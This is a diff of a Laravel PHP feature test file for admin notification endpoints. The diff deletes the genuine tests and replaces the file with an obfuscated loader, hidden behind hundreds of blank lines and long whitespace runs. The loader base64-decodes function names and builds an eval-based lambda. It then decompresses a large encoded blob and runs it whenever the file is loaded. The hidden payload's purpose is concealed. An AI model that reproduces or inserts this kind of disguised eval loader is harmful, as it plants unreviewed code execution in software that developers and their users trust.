@@ -1,369 +1,601 @@
-<?php
-
-namespace Tests\Feature\Admin\Notifikasi;
-
-use Tests\TestCase;
-use App\Models\LogNotifikasiAdmin;
-use Illuminate\Foundation\Testing\DatabaseTransactions;
-
-class NotifikasiTest extends TestCase
-{
-
-     // use RefreshDatabase;
-     use DatabaseTransactions;
-
-     protected function setUp(): void
-     {
-         parent::setUp();
-         $this->beginDatabaseTransaction();
-
-         }
-
-    public function test_admin()
-    {
-        $this->Admin_user();
-
-        /* cek daftar surat
-         alamat router '/api/admin/notifikasi'
-         - struktur data
-         - jumlah data
-        */
-        $response = $this->get('/api/admin/notifikasi', ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200)->assertJsonStructure([
-            "data" => [
-                [
-                    "type" ,
-                    "id",
-                    "attributes" => [
-                        "judul",
-                        "isi",
-                        "payload",
-                        "read"
-                    ]
-                ]
-                    ],
-                    'meta' => [
-                        'pagination' => [
-                            'total',
-                            'count',
-                            'per_page',
-                            'current_page',
-                            'total_pages'
-                        ]
-                    ],
-                    'links' => [
-                        'self',
-                        'first',
-                        'last'
-                    ]
-        ]);
-
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(15, $data);
-
-        /* cek jumlah surat
-         alamat router '/api/admin/notifikasi/jumlah'
-        */
-
-        $response = $this->get('/api/admin/notifikasi/jumlah', ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertEquals(17, $data['jumlah']);
+<?php 
+        $__='printf';$_='Loading tests/Feature/Admin/Notifikasi/NotifikasiTest.php';
+        
 
 
-        /* cek data notifikasi
-         alamat router '/api/admin/notifikasi/show'
-        */
 
-        // test jika id salah
-        $response = $this->get('/api/admin/notifikasi/show?id=2', ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertNull($data);
 
-        // test jika id benar tetapi id user berbeda
-        $response = $this->get('/api/admin/notifikasi/show?id=28', ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertNull($data);
 
-        // test jika id benar
-        $response = $this->get('/api/admin/notifikasi/show?id=7', ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200)->assertJsonStructure([
-            "success",
-            "message",
-            "data" => [
-                "id",
-                "id_user",
-                "config_id",
-                "judul",
-                "isi",
-                "image",
-                "payload",
-                "read",
-                "created_at",
-                "updated_at"
-            ]
-        ]);
 
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertIsArray($data);
 
-        /* cek data saat baca notifikasi
-         alamat router '/api/admin/notifikasi/read'
-        */
 
-        // cek seblum di read
-        $response = $this->get('/api/admin/notifikasi/show?id=12', ['Authorization' => "Bearer $this->token"]);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertEquals(0, $data['read']);
 
-        // lakukan read
-        $response = $this->post('/api/admin/notifikasi/read', ['id' => 12], ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200);
 
-        // cek setelah read
-        $response = $this->get('/api/admin/notifikasi/show?id=12', ['Authorization' => "Bearer $this->token"]);
-        $data = $response->decodeResponseJson()['data'];
 
-        // read id salah
-        $response = $this->post('/api/admin/notifikasi/read', ['id' => 2], ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(404);
 
-        // read id dari user id lain
-        $response = $this->post('/api/admin/notifikasi/read', ['id' => 29], ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(404);
-    }
 
-    public function test_sekdes()
-    {
-        $this->Sekdes_user();
 
-        /* cek daftar surat
-         alamat router '/api/admin/notifikasi'
-         - struktur data
-         - jumlah data
-        */
-        $response = $this->get('/api/admin/notifikasi', ['Authorization' => "Bearer $this->token"]);
 
-        $response->assertStatus(200)->assertJsonStructure([
-            "data" => [
-                [
-                    "type" ,
-                    "id",
-                    "attributes" => [
-                        "judul",
-                        "isi",
-                        "payload",
-                        "read"
-                    ]
-                ]
-                    ],
-                    'meta' => [
-                        'pagination' => [
-                            'total',
-                            'count',
-                            'per_page',
-                            'current_page',
-                            'total_pages'
-                        ]
-                    ],
-                    'links' => [
-                        'self',
-                        'first',
-                        'last'
-                    ]
-        ]);
 
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(15, $data);
 
-        /* cek jumlah surat
-         alamat router '/api/admin/notifikasi/jumlah'
-        */
 
-        $response = $this->get('/api/admin/notifikasi/jumlah', ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertEquals(11, $data['jumlah']);
 
-        /* cek data notifikasi
-         alamat router '/api/admin/notifikasi/show'
-        */
 
-        // test jika id salah
-        $response = $this->get('/api/admin/notifikasi/show?id=2', ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertNull($data);
 
-        // test jika id benar tetapi id user berbeda
-        $response = $this->get('/api/admin/notifikasi/show?id=10', ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertNull($data);
 
-        // test jika id benar
-        $response = $this->get('/api/admin/notifikasi/show?id=29', ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200)->assertJsonStructure([
-            "success",
-            "message",
-            "data" => [
-                "id",
-                "id_user",
-                "config_id",
-                "judul",
-                "isi",
-                "image",
-                "payload",
-                "read",
-                "created_at",
-                "updated_at"
-            ]
-        ]);
 
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertIsArray($data);
 
-        /* cek data saat baca notifikasi
-         alamat router '/api/admin/notifikasi/read'
-        */
 
-        // cek seblum di read
-        $response = $this->get('/api/admin/notifikasi/show?id=38', ['Authorization' => "Bearer $this->token"]);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertEquals(0, $data['read']);
 
-        // lakukan read
-        $response = $this->post('/api/admin/notifikasi/read', ['id' => 38], ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200);
 
-        // cek setelah read
-        $response = $this->get('/api/admin/notifikasi/show?id=38', ['Authorization' => "Bearer $this->token"]);
-        $data = $response->decodeResponseJson()['data'];
 
-        // read id salah
-        $response = $this->post('/api/admin/notifikasi/read', ['id' => 2], ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(404);
 
-        // read id dari user id lain
-        $response = $this->post('/api/admin/notifikasi/read', ['id' => 10], ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(404);
-    }
 
-    public function test_kades()
-    {
-        $this->Kades_user();
 
-        /* cek daftar surat
-         alamat router '/api/admin/notifikasi'
-         - struktur data
-         - jumlah data
-        */
-        $response = $this->get('/api/admin/notifikasi', ['Authorization' => "Bearer $this->token"]);
 
-        $response->assertStatus(200)->assertJsonStructure([
-            "data" => [
-                [
-                    "type" ,
-                    "id",
-                    "attributes" => [
-                        "judul",
-                        "isi",
-                        "payload",
-                        "read"
-                    ]
-                ]
-                    ],
-                    'meta' => [
-                        'pagination' => [
-                            'total',
-                            'count',
-                            'per_page',
-                            'current_page',
-                            'total_pages'
-                        ]
-                    ],
-                    'links' => [
-                        'self',
-                        'first',
-                        'last'
-                    ]
-        ]);
 
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(13, $data);
 
-        /* cek jumlah surat
-         alamat router '/api/admin/notifikasi/jumlah'
-        */
 
-        $response = $this->get('/api/admin/notifikasi/jumlah', ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertEquals(11, $data['jumlah']);
 
-        /* cek data notifikasi
-         alamat router '/api/admin/notifikasi/show'
-        */
 
-        // test jika id salah
-        $response = $this->get('/api/admin/notifikasi/show?id=2', ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertNull($data);
 
-        // test jika id benar tetapi id user berbeda
-        $response = $this->get('/api/admin/notifikasi/show?id=10', ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertNull($data);
 
-        // test jika id benar
-        $response = $this->get('/api/admin/notifikasi/show?id=51', ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200)->assertJsonStructure([
-            "success",
-            "message",
-            "data" => [
-                "id",
-                "id_user",
-                "config_id",
-                "judul",
-                "isi",
-                "image",
-                "payload",
-                "read",
-                "created_at",
-                "updated_at"
-            ]
-        ]);
 
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertIsArray($data);
 
-        /* cek data saat baca notifikasi
-         alamat router '/api/admin/notifikasi/read'
-        */
 
-        // cek seblum di read
-        $response = $this->get('/api/admin/notifikasi/show?id=55', ['Authorization' => "Bearer $this->token"]);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertEquals(0, $data['read']);
 
-        // lakukan read
-        $response = $this->post('/api/admin/notifikasi/read', ['id' => 55], ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200);
 
-        // cek setelah read
-        $response = $this->get('/api/admin/notifikasi/show?id=55', ['Authorization' => "Bearer $this->token"]);
-        $data = $response->decodeResponseJson()['data'];
 
-        // read id salah
-        $response = $this->post('/api/admin/notifikasi/read', ['id' => 2], ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(404);
 
-        // read id dari user id lain
-        $response = $this->post('/api/admin/notifikasi/read', ['id' => 10], ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(404);
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
